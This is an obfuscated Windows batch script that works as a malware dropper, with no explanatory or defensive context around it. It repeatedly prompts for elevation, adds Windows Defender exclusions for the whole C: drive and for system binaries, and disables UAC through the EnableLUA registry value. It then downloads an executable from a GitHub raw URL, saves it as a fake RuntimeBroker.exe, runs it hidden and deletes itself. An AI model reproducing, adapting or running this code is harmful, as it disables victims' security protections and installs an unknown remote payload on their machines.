@echo off & setlocal enableDelayedExpansion
set "QDkio=NET" & set "CfVC=2>&1" & set "zGt=>nul" & set "dRi=SESSION"
%QDkio% %dRi% %zGt% %CfVC%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "wOg=bar" & set "DXfp=foo" & set "wuE=baz" & set "NQZP=qux" & rem RHccK Zdg mtt
set "aZSS=powershell -ExecutionPolicy Bypass -Command"
set "uAT=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "UjUX='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "wHIz='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!aZSS! "!uAT! !UjUX! !wHIz!" %zGt% %CfVC%
set "OgTe=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "kBOs=-Name 'EnableLUA' -Value 0"
!aZSS! "!OgTe! !kBOs!" %zGt% %CfVC%
set "rsn=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!aZSS! "!rsn!" %zGt% %CfVC%
if !errorlevel! neq 0 (goto %a%)
set "BPDfs=timeout /t" & !BPDfs! 2 %zGt% %CfVC%
set "HKsWm=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "eKi=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "bIqf=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!aZSS! "!HKsWm! !eKi! !bIqf!" %zGt% %CfVC%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!BPDfs! 1 %zGt% %CfVC% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %zGt% %CfVC%
del /f /q "%~f0" %zGt% %CfVC%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %zGt% %CfVC%
if !errorlevel! neq 0 (!BPDfs! 3 %zGt% %CfVC% & goto %b%)
exit /b
